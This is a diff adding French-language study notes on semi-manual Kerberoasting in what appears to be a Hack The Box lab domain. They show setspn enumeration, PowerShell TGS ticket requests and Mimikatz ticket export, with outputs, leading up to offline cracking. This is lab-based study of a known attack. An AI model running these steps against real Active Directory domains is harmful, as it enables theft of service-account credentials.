@@ -2644,7 +2644,125 @@ Nous pouvons également choisir de récupérer tous les tickets avec cette méth
 
 La méthode semi-manuelle de Kerberoasting consiste à énumérer les SPN dans un domaine, puis à cibler un utilisateur spécifique pour obtenir des tickets TGS via PowerShell. Ces tickets peuvent ensuite être extraits avec Mimikatz. Cette méthode est la base de ce qui est automatisé par des outils comme Rubeus, mais elle reste utile pour comprendre le fonctionnement de Kerberoasting à un niveau plus fondamental.
 
+# Kerberoasting - Semi-Manual Method
 
+## Introduction
+
+Avant l'existence d'outils comme Rubeus, le vol ou la falsification de tickets Kerberos était un processus complexe et manuel. Aujourd'hui, les tactiques et les défenses ayant évolué, nous pouvons effectuer du Kerberoasting depuis Windows de différentes manières. Cet article explore d'abord la méthode manuelle, puis les outils automatisés.
+
+---
+
+## Énumération des SPN avec `setspn.exe`
+
+### Commande utilisée :
+```cmd
+C:\htb> setspn.exe -Q */*
+```
+
+### Résultats :
+
+```plaintext
+Checking domain DC=INLANEFREIGHT,DC=LOCAL
+CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
+        exchangeAB/ACADEMY-EA-DC01
+        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        TERMSRV/ACADEMY-EA-DC01
+        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
+
+<SNIP>
+
+CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        backupjob/veam001.inlanefreight.local
+CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        sts/inlanefreight.local
+
+<SNIP>
+
+CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SPSJDB.inlanefreight.local:1433
+CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
+CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        adfsconnect/azure01.inlanefreight.local
+
+Existing SPN found!
+```
+
+Nous observons différents SPN renvoyés pour divers hôtes dans le domaine. Nous nous concentrons sur les comptes utilisateurs et ignorons les comptes machines retournés.
+
+---
+
+## Ciblage d'un Utilisateur Unique
+
+### Commandes PowerShell :
+```powershell
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+### Résultat :
+```plaintext
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:36:22 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+```
+
+---
+
+## Récupération de Tous les Tickets
+
+### Commande PowerShell :
+```powershell
+PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+### Résultat :
+```plaintext
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+<SNIP>
+```
+
+---
+
+## Extraction des Tickets avec Mimikatz
+
+### Commandes Mimikatz :
+```plaintext
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+```
+
+### Exemple de Résultat :
+```plaintext
+[00000002] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
+   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
+   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+====================
+Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+====================
+```
+
+---
+
+## Préparation pour le Craquage
+
+Prenez le blob Base64 extrait et supprimez les sauts de ligne et les espaces blancs, car la sortie est en colonne et doit être sur une seule ligne.
 
 
 
